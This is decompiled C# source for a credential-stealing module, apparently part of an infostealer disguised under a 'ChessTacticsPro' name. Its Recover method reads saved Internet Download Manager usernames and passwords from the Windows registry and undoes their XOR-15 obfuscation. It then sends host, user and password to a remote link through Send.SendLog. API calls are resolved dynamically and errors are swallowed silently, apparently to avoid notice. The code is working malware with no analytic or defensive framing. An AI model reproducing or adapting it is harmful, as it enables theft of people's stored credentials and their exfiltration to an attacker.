using System;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

// Token: 0x0200000E RID: 14
public class InternetDownloadManager
{
	// Token: 0x06000045 RID: 69 RVA: 0x0000380C File Offset: 0x0000280C
	public static void Recover()
	{
		string text = "Software\\DownloadManager\\Passwords\\";
		string text2 = Environment.NewLine + "Program: Internet Download Manager >6 " + Environment.NewLine + Environment.NewLine;
		IntPtr hKey = new IntPtr(-2147483647);
		checked
		{
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(text);
				foreach (string text3 in registryKey.GetSubKeyNames())
				{
					RegistryKey registryKey2 = registryKey.OpenSubKey(text3);
					InternetDownloadManager.SafeKeyHandle safeKeyHandle = null;
					int num = InternetDownloadManager.NativeMethods.RegOpenKeyEx(hKey, text + text3, 0, 131097, out safeKeyHandle);
					byte[] array = new byte[257];
					byte[] array2 = new byte[257];
					InternetDownloadManager.NativeMethods.RegQueryValueExParameters regQueryValueEx = InternetDownloadManager.NativeMethods.RegQueryValueEx;
					InternetDownloadManager.SafeKeyHandle hKey2 = safeKeyHandle;
					string lpValueName = "User";
					int reserved = 0;
					int num2 = 0;
					byte[] data = array;
					int num3 = 256;
					num = regQueryValueEx(hKey2, lpValueName, reserved, out num2, data, ref num3);
					InternetDownloadManager.NativeMethods.RegQueryValueExParameters regQueryValueEx2 = InternetDownloadManager.NativeMethods.RegQueryValueEx;
					InternetDownloadManager.SafeKeyHandle hKey3 = safeKeyHandle;
					string lpValueName2 = "EncPassword";
					int reserved2 = 0;
					num3 = 0;
					byte[] data2 = array2;
					num2 = 256;
					num = regQueryValueEx2(hKey3, lpValueName2, reserved2, out num3, data2, ref num2);
					int num4 = 0;
					string host = text3;
					int num5 = 0;
					int num6 = array.Length - 1;
					for (int j = num5; j <= num6; j++)
					{
						if (array[j] == 0)
						{
							break;
						}
						num4++;
					}
					array = (byte[])Utils.CopyArray((Array)array, new byte[num4 - 1 + 1]);
					string @string = Encoding.Default.GetString(array);
					string text4 = null;
					int num7 = 0;
					int num8 = array2.Length - 1;
					for (int k = num7; k <= num8; k++)
					{
						if (array2[k] == 0)
						{
							break;
						}
						text4 += Conversions.ToString(Strings.ChrW((int)(array2[k] ^ 15)));
					}
					string password = text4;
					Send.SendLog(ChessTacticsPro.P_Link, "Passwords", null, null, "IDM", host, @string, password, null);
				}
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x02000015 RID: 21
	public class SafeKeyHandle : SafeHandle
	{
		// Token: 0x0600007F RID: 127 RVA: 0x000039F8 File Offset: 0x000029F8
		public SafeKeyHandle() : base(IntPtr.Zero, true)
		{
		}

		// Token: 0x17000007 RID: 7
		// (get) Token: 0x06000080 RID: 128 RVA: 0x00003A08 File Offset: 0x00002A08
		public override bool IsInvalid
		{
			get
			{
				return this.handle == IntPtr.Zero;
			}
		}

		// Token: 0x06000081 RID: 129 RVA: 0x00003A2C File Offset: 0x00002A2C
		protected override bool ReleaseHandle()
		{
			return InternetDownloadManager.NativeMethods.RegCloseKey(this.handle) == 0;
		}
	}

	// Token: 0x02000016 RID: 22
	[SuppressUnmanagedCodeSecurity]
	public class NativeMethods
	{
		// Token: 0x0400003A RID: 58
		public static readonly InternetDownloadManager.NativeMethods.RegOpenKeyExAParameters RegOpenKeyEx = Dynamic.CreateApi<InternetDownloadManager.NativeMethods.RegOpenKeyExAParameters>("Advapi32", "RegOpenKeyEx");

		// Token: 0x0400003B RID: 59
		public static readonly InternetDownloadManager.NativeMethods.RegCloseKeyParameters RegCloseKey = Dynamic.CreateApi<InternetDownloadManager.NativeMethods.RegCloseKeyParameters>("Advapi32", "RegCloseKey");

		// Token: 0x0400003C RID: 60
		public static readonly InternetDownloadManager.NativeMethods.RegQueryValueExParameters RegQueryValueEx = Dynamic.CreateApi<InternetDownloadManager.NativeMethods.RegQueryValueExParameters>("Advapi32", "RegQueryValueEx");

		// Token: 0x0200002A RID: 42
		// (Invoke) Token: 0x060000C7 RID: 199
		public delegate int RegOpenKeyExAParameters([In] IntPtr hKey, [In] string subKey, int options, [In] int samDesired, out InternetDownloadManager.SafeKeyHandle phkResult);

		// Token: 0x0200002B RID: 43
		// (Invoke) Token: 0x060000CB RID: 203
		public delegate int RegCloseKeyParameters(IntPtr hKey);

		// Token: 0x0200002C RID: 44
		// (Invoke) Token: 0x060000CF RID: 207
		public delegate int RegQueryValueExParameters([In] InternetDownloadManager.SafeKeyHandle hKey, [In] string lpValueName, int reserved, out int type, [Out] byte[] data, [In] [Out] ref int dataSize);
	}
}
